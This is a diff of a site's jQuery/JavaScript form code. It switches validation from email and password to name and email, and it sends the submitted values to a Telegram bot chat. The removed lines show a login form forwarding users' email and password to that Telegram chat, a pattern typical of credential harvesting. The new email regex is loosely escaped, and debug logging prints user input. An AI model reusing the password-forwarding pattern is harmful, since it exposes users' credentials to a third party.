@@ -86,10 +86,8 @@ $(document).ready(function () {
   let header = document.querySelector('.header');
   let headerStyle = window.getComputedStyle(header);
   let headerHeight = parseFloat(headerStyle.height);
-  console.log(headerHeight);
 
   let element = document.getElementById('hero').getBoundingClientRect();
-  console.log(element.height);
   let height = element.height-headerHeight;
 
   
@@ -142,67 +140,67 @@ $(document).ready(function () {
     // ... other settings
   });
 
-
-
-
 });
 
 // Валідація форми
-const EMAIL_MIN_LENGHT = 5;
-const mediumRegex = new RegExp("^(((?=.*[a-z])(?=.*[A-Z]))|((?=.*[a-z])(?=.*[0-9]))|((?=.*[A-Z])(?=.*[0-9])))(?=.{8,})");
+const NAME_MIN_LENGTH = 3;
+const emailRegex = new RegExp('[a-z0-9]+@[a-z]+\.[a-z]{2,3}');
 
-function testPasswordRegex(value) {
-    return mediumRegex.test(value);
+function testEmailRegex(value) {
+  return emailRegex.test(value);
 }
 
-function checkEmailLenght() {
-    const valueLenght = window.inputEmail.value.length;
-    const diff = valueLenght < EMAIL_MIN_LENGHT ? EMAIL_MIN_LENGHT - valueLenght : 0;
-
-    if(diff) {
-        window.emailDiffCount.textContent = diff;
-        window.emailLenghtHelp.classList.remove('d-none');
-    } else {
-        window.emailLenghtHelp.classList.add('d-none');
-    }
+function checkNameLenght() {
+  const valueLength = window.inputName.value.length;
+  const diff = valueLength < NAME_MIN_LENGTH ? NAME_MIN_LENGTH - valueLength : 0;
+  if(diff) {
+    window.nameDiffCount.textContent = diff;
+    window.nameLenghtHelp.classList.remove('d-none');
+  } else {
+    window.nameLenghtHelp.classList.add('d-none');
+  }
 };
 
 function resetValidation() {
-    window.emailHelp.classList.add('d-none');
-    window.passwordHelp.classList.add('d-none');
-    window.passwordHelpDescription.classList.add('d-none');
+  window.namelHelp.classList.add('d-none');
+  window.emailHelp.classList.add('d-none');
+  window.emailLenghtHelp.classList.add('d-none');
+  
 }
-
 function validateForm(event) {
-    event.preventDefault();
-    resetValidation();
-    
-    const email = window.inputEmail.value;
-    const password = window.inputPassword.value;
+  event.preventDefault();
+  resetValidation();
+  
+  const name = window.inputName.value;
+  const email = window.inputEmail.value;
+  console.log(name);
+  console.log(email);
 
-    if(!email) {
-        window.emailHelp.classList.remove('d-none');
-        return false;
-    }
-    if(!password) {
-        window.passwordHelp.classList.remove('d-none');
-        return false;
-    }
+  if(!name) {
+    window.namelHelp.classList.remove('d-none');
+    return false;
+  }
+  if(!email) {
+    window.emailHelp.classList.remove('d-none');
+    return false;
+  }
+  if(!testEmailRegex(email)) {
+    window.emailHelp.classList.remove('d-none');
+    window.emailLenghtHelp.classList.remove('d-none');
+  }
+};
 
-    if(!testPasswordRegex(password)) {
-        window.passwordHelp.classList.remove('d-none');
-        window.passwordHelpDescription.classList.remove('d-none');
-    }
 
-    
-}
+window.inputName.addEventListener('input', checkNameLenght);
+window.loginForm.addEventListener('submit', validateForm);
+document.addEventListener("DOMContentLoaded", checkNameLenght);
 
 async function formSubmit(event) {
     event.preventDefault();
     const email = window.inputEmail.value;
-    const password = window.inputPassword.value;
+    const userName = window.inputName.value;
 
-    if(!email || !password) {
+    if(!email || !userName) {
       return false;
     }
 
@@ -210,7 +208,7 @@ async function formSubmit(event) {
     let chatId = "-1001923473956";
     let text = `
     <b>Email: </b> ${email}
-    <b>Password </b> ${password}
+    <b>userName: </b> ${userName}
     `;
 
     let urlString = `https://api.telegram.org/bot${apiToken}/sendMessage`;
@@ -229,13 +227,8 @@ async function formSubmit(event) {
     });
     const resp = await response.json();
     console.log(resp);
-    // let request = new XMLHttpRequest();
-    // request.open("GET", urlString);
-    // request.send();
-    // let response = request.response;
-
-    // Do what you want with response
+   
 }
+console.log();
 
-// window.inputEmail.addEventListener('input', checkEmailLenght);
 window.loginForm.addEventListener('submit', formSubmit);
